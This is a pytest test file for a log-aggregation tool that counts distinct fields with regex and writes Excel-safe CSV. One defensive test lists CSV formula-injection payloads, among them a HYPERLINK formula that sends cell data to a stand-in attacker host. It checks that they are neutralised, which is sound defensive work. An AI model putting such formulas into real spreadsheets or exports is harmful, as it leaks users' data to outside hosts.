import csv

import pytest

from app.last9.aggregate import (
    AggregationError,
    AggregationSpec,
    Aggregator,
    excel_safe,
    normalize_pattern,
)
from app.last9.distinct_store import DistinctStore

# Mirrors the real one-use-case log line (double spaces included, on purpose —
# that's exactly what broke the literal-phrase filter earlier).
LINE = "AHA-1-6a907c43 - ClassName  CGetEntitlementsCommand SPAccountId  2112091 in BU  AHA INDIA API User ahaapiuser"
PATTERN = (
    r"^\s*(?<trackerid>AHA-\d-[a-f0-9]+)\s+-\s+ClassName\s+(?<api>\w+)\s+"
    r"SPAccountId\s+(?<spid>\d+)\s+in\s+BU\s+(?<BU>.*?)\s+API User.*$"
)


@pytest.fixture
def store(tmp_path):
    s = DistinctStore(str(tmp_path / "d.sqlite"))
    yield s
    s.close()


def agg_at(
    path, *, group_by=(), unique_fields=("spid",), fresh=False, regex=PATTERN, excel_escape=False
):
    """An Aggregator over a store at `path` — reopening the same path is what
    'resume' means now, so tests can do it directly."""
    s = DistinctStore(str(path), fresh=fresh)
    return Aggregator(
        AggregationSpec(
            regex=regex,
            group_by=list(group_by),
            unique_fields=list(unique_fields),
            excel_escape=excel_escape,
        ),
        s,
    )


def test_normalize_converts_dotnet_named_groups_to_python():
    assert normalize_pattern("(?<spid>\\d+)") == "(?P<spid>\\d+)"
    # Already-Python patterns pass through unchanged.
    assert normalize_pattern("(?P<spid>\\d+)") == "(?P<spid>\\d+)"


def test_rejects_invalid_regex(store):
    with pytest.raises(AggregationError):
        Aggregator(AggregationSpec(regex="(unclosed", unique_fields=["x"]), store)


def test_rejects_group_by_or_unique_field_not_in_regex(store):
    with pytest.raises(AggregationError):
        Aggregator(AggregationSpec(regex=PATTERN, group_by=["nope"], unique_fields=["spid"]), store)
    with pytest.raises(AggregationError):
        Aggregator(AggregationSpec(regex=PATTERN, unique_fields=["nope"]), store)


def test_rejects_a_field_that_is_both_grouped_by_and_counted(store):
    """Grouping by the counted field puts every value in a group of its own, so
    every count is 1 — a believable-looking report that says nothing. Caught as
    a config error rather than produced."""
    with pytest.raises(AggregationError, match="both grouped by and counted"):
        Aggregator(
            AggregationSpec(regex=PATTERN, group_by=["api", "BU", "spid"], unique_fields=["spid"]),
            store,
        )


@pytest.mark.parametrize(
    "value",
    [
        "260502053603972127523",  # 21 digits
        "230702032635917346995349",  # 24 digits — showed as 2.30702E+23
        "220808164446813",  # exactly 15 — an all-digits length check missed this
        "230702E23",  # hex id Excel reads as scientific notation
        "2112091",  # short, but an id is still not a number
    ],
)
def test_excel_safe_guards_anything_excel_reads_as_a_number(value):
    assert excel_safe(value) == f'="{value}"'


@pytest.mark.parametrize(
    "value",
    [
        "AHA INDIA",
        "74a96d1c-40cc-4f55-bc0f-de35157212ae",
        "8508117c6aee64760c769095678ff96295321e00fcfe641fd3a07a7761d31150",
        "",
    ],
)
def test_excel_safe_leaves_alone_what_excel_keeps_as_text(value):
    # Untouched so the file stays clean for readers that aren't Excel.
    assert excel_safe(value) == value


@pytest.mark.parametrize(
    "value",
    [
        "=1+1",
        '=HYPERLINK("http://evil.example/"&A1)',
        "+1234",
        "-2+3",
        "@SUM(A1:A9)",
        "\t=1+1",
    ],
)
def test_excel_safe_neutralises_formula_triggers(value):
    """A log line starting =, +, -, or @ is a formula when the CSV is opened.

    These files exist to be opened in Excel, and the content is attacker-
    influenced: it comes from application log text. Only values that parsed as
    numbers were being wrapped, so `=HYPERLINK(...)` went through verbatim and
    executed on open.
    """
    out = excel_safe(value)
    assert out.startswith('="'), f"{value!r} must not reach the sheet as a live formula"
    assert out.endswith('"')


def test_columns_are_the_aggregated_fields_plus_the_matching_format(store):
    """Not every named group: with a library of hundreds of formats that would
    be hundreds of columns, and the header is written before the first row."""
    agg = Aggregator(
        AggregationSpec(
            regex=PATTERN,
            group_by=["api", "BU"],
            unique_fields=["spid"],
            excel_escape=True,
        ),
        store,
    )
    assert agg.parsed_fields == ["log_format", "api", "BU", "spid"]

    cols = agg.process(LINE.replace("2112091", "230702032635917346995349"))
    assert cols == [
        "pattern",  # the implicit single-format name
        "CGetEntitlementsCommand",
        "AHA INDIA",
        '="230702032635917346995349"',  # the id Excel would have wrecked
    ]


def test_warehouse_default_emits_plain_values_with_no_excel_wrapper(store):
    """EXCEL_ESCAPE is off by default: `="..."` is literal data to a warehouse."""
    agg = Aggregator(
        AggregationSpec(regex=PATTERN, group_by=["api", "BU"], unique_fields=["spid"]),
        store,
    )
    assert agg.excel_escape is False
    assert agg.process(LINE) == ["pattern", "CGetEntitlementsCommand", "AHA INDIA", "2112091"]
    # And the raw value survives untouched, digits and all.
    long_id = "230702032635917346995349"
    assert agg.process(LINE.replace("2112091", long_id))[-1] == long_id


def test_include_log_format_false_drops_the_leading_column(store):
    """A deliverable of parsed fields only, no format tag — the common case
    for a single ad-hoc regex where there's only ever one format anyway."""
    agg = Aggregator(
        AggregationSpec(
            regex=PATTERN,
            group_by=["api", "BU"],
            unique_fields=["spid"],
            include_log_format=False,
            excel_escape=True,
        ),
        store,
    )
    assert agg.parsed_fields == ["api", "BU", "spid"]
    assert agg.process(LINE) == ["CGetEntitlementsCommand", "AHA INDIA", '="2112091"']


def test_include_log_format_does_not_affect_an_explicit_raw_columns_list(store):
    """An explicit raw_columns is already exact columns, exact order — the flag
    only governs the implicit default set, so it has nothing to add or remove
    here regardless of its value."""
    agg = Aggregator(
        AggregationSpec(
            regex=PATTERN,
            unique_fields=["spid"],
            raw_columns=["api", "spid"],
            include_log_format=True,
            excel_escape=True,
        ),
        store,
    )
    assert agg.parsed_fields == ["api", "spid"]
    assert agg.process(LINE) == ["CGetEntitlementsCommand", '="2112091"']


def test_uniform_layout_orders_columns_and_renames_headers(store):
    """The uniform-extract story: raw_columns is the user-numbered sequence,
    column_labels renames each header, so different log shapes emit the same
    CSV columns in the same order."""
    agg = Aggregator(
        AggregationSpec(
            regex=PATTERN,
            group_by=["api", "BU"],
            unique_fields=["spid"],
            raw_columns=["api", "spid", "BU"],
            column_labels={"spid": "spAccountID", "BU": "bu_name"},
            timestamp_column="timestamp",
            include_log_format=False,
            excel_escape=True,
        ),
        store,
    )
    assert agg.parsed_fields == ["api", "spid", "BU"]
    assert agg.parsed_field_labels == ["api", "spAccountID", "bu_name"]
    assert agg.timestamp_column == "timestamp"
    assert agg.process(LINE) == ["CGetEntitlementsCommand", '="2112091"', "AHA INDIA"]


def test_process_returns_none_when_nothing_matches(store):
    agg = Aggregator(AggregationSpec(regex=PATTERN, unique_fields=["spid"]), store)
    assert agg.process("this line matches nothing") is None
    assert agg.rows_unmatched == 1


def test_process_counts_each_row_once(store):
    """Matching feeds the aggregate and produces the columns in one pass — doing
    those separately would double every per-format tally."""
    agg = Aggregator(AggregationSpec(regex=PATTERN, group_by=["BU"], unique_fields=["spid"]), store)
    for _ in range(3):
        agg.process(LINE)
    assert agg.rows_matched == 3
    assert agg.coverage() == [{"format": "pattern", "rows": 3}]


def test_summary_csv_guards_long_numeric_group_values(tmp_path):
    long_id = "260502053603972127523"
    agg = agg_at(
        tmp_path / "job.sqlite",
        group_by=["spid"],
        unique_fields=["trackerid"],
        excel_escape=True,
    )
    agg.feed(LINE.replace("2112091", long_id))

    out = tmp_path / "summary.csv"
    agg.write_summary_csv(str(out))
    body = out.read_text(encoding="utf-8")
    # csv escaping doubles the inner quotes; Excel unescapes that back to the
    # ="..." formula and renders it as text.
    assert f'"=""{long_id}"""' in body
    # Read back through a csv reader, the value is the plain formula form and
    # every digit survives — the point of the guard.
    with open(out, encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1][0] == f'="{long_id}"'
    assert long_id in rows[1][0]
    agg.store.close()


def test_single_unique_field_counts_distinct_values_per_group(store):
    agg = Aggregator(
        AggregationSpec(regex=PATTERN, group_by=["api", "BU"], unique_fields=["spid"]), store
    )
    agg.feed(LINE)
    agg.feed(LINE.replace("2112091", "2112092"))  # same group, different spid
    agg.feed(LINE)  # duplicate spid — must not double-count

    snap = agg.snapshot()
    assert snap["rows_matched"] == 3
    assert snap["rows_unmatched"] == 0
    assert len(snap["groups"]) == 1
    g = snap["groups"][0]
    assert g["key"] == {"api": "CGetEntitlementsCommand", "BU": "AHA INDIA"}
    assert g["unique_counts"] == {"spid": 2}


def test_multiple_unique_fields_counted_independently(store):
    # The whole point of this feature: not just SPID — any number of attributes.
    agg = Aggregator(
        AggregationSpec(regex=PATTERN, group_by=["api"], unique_fields=["spid", "trackerid"]), store
    )
    agg.feed(LINE)
    agg.feed(LINE.replace("2112091", "2112092").replace("6a907c43", "deadbeef"))

    g = agg.snapshot()["groups"][0]
    assert g["unique_counts"] == {"spid": 2, "trackerid": 2}


def test_non_matching_rows_are_skipped_not_fatal(store):
    agg = Aggregator(AggregationSpec(regex=PATTERN, unique_fields=["spid"]), store)
    agg.feed("this line matches nothing")
    agg.feed(LINE)
    snap = agg.snapshot()
    assert snap["rows_matched"] == 1
    assert snap["rows_unmatched"] == 1


def test_reopening_the_store_preserves_exact_counts_across_resume(tmp_path):
    path = tmp_path / "job.sqlite"
    agg = agg_at(path, group_by=["BU"])
    agg.feed(LINE)
    agg.feed(LINE.replace("2112091", "2112092"))
    agg.flush()
    agg.store.close()

    resumed = agg_at(path, group_by=["BU"])  # resume == reopen; no state to restore
    resumed.feed(LINE.replace("2112091", "2112093"))  # a third distinct spid, post-resume

    snap = resumed.snapshot()
    assert snap["rows_matched"] == 3
    assert snap["groups"][0]["unique_counts"] == {"spid": 3}
    resumed.store.close()


def test_replaying_a_chunk_does_not_inflate_counts(tmp_path):
    """Resume replays the chunk that was in flight when the job stopped. That is
    only safe because insertion is idempotent — this is the property that makes
    it so."""
    path = tmp_path / "job.sqlite"
    agg = agg_at(path, group_by=["BU"])
    for line in (LINE, LINE.replace("2112091", "2112092")):
        agg.feed(line)
    agg.flush()
    agg.store.close()

    replayed = agg_at(path, group_by=["BU"])
    for line in (LINE, LINE.replace("2112091", "2112092")):  # same rows again
        replayed.feed(line)
    assert replayed.snapshot()["groups"][0]["unique_counts"] == {"spid": 2}
    replayed.store.close()


def test_fresh_discards_a_store_left_by_a_previous_attempt(tmp_path):
    path = tmp_path / "job.sqlite"
    first = agg_at(path, group_by=["BU"])
    first.feed(LINE)
    first.flush()
    first.store.close()

    restarted = agg_at(path, group_by=["BU"], fresh=True)
    snap = restarted.snapshot()
    assert snap["rows_matched"] == 0
    assert snap["groups"] == []
    restarted.store.close()


def test_snapshot_caps_groups_but_reports_the_true_total(tmp_path):
    agg = agg_at(tmp_path / "job.sqlite", group_by=["spid"], unique_fields=["trackerid"])
    for i in range(10):
        agg.feed(LINE.replace("2112091", f"21120{i:02d}"))

    snap = agg.snapshot(limit=3)
    assert len(snap["groups"]) == 3
    assert snap["truncated"] is True
    assert snap["total_groups"] == 10  # the real number, not the capped one
    agg.store.close()


def test_summary_csv_has_a_row_per_group_and_a_column_per_unique_field(tmp_path):
    agg = agg_at(tmp_path / "job.sqlite", group_by=["BU"], unique_fields=["spid", "trackerid"])
    agg.feed(LINE)
    agg.feed(LINE.replace("2112091", "2112092").replace("6a907c43", "deadbeef"))
    agg.feed(LINE.replace("AHA INDIA", "AHA MIDDLE EAST"))

    out = tmp_path / "summary.csv"
    assert agg.write_summary_csv(str(out)) == 2
    lines = out.read_text(encoding="utf-8").splitlines()
    assert lines[0] == "BU,unique_spid,unique_trackerid"
    assert "AHA INDIA,2,2" in lines
    assert "AHA MIDDLE EAST,1,1" in lines
    agg.store.close()


def test_value_counts_csv_carries_the_group_columns(tmp_path):
    """Each row has to say which BU the value belongs to — a bare value/count
    pair can't be attributed to a customer."""
    agg = agg_at(
        tmp_path / "job.sqlite",
        group_by=["api", "BU"],
        unique_fields=["spid"],
        excel_escape=True,
    )
    agg.feed(LINE)  # AHA INDIA, spid 2112091
    agg.feed(LINE)  # same spid again -> count 2
    agg.feed(LINE.replace("AHA INDIA", "AHA US").replace("2112091", "9001"))

    out = tmp_path / "counts.csv"
    agg.write_value_counts_csv(str(out))
    with open(out, encoding="utf-8") as fh:
        rows = list(csv.reader(fh))

    assert rows[0] == ["spid", "api", "BU", "count"]
    # Most frequent first.
    assert rows[1] == ['="2112091"', "CGetEntitlementsCommand", "AHA INDIA", "2"]
    assert rows[2] == ['="9001"', "CGetEntitlementsCommand", "AHA US", "1"]
    agg.store.close()


def test_value_counts_csv_is_plain_by_default(tmp_path):
    """Warehouse-ready: no ="..." wrapper unless EXCEL_ESCAPE is enabled."""
    agg = agg_at(tmp_path / "job.sqlite", group_by=["api", "BU"], unique_fields=["spid"])
    agg.feed(LINE)
    out = tmp_path / "counts.csv"
    agg.write_value_counts_csv(str(out))
    with open(out, encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1] == ["2112091", "CGetEntitlementsCommand", "AHA INDIA", "1"]
    agg.store.close()
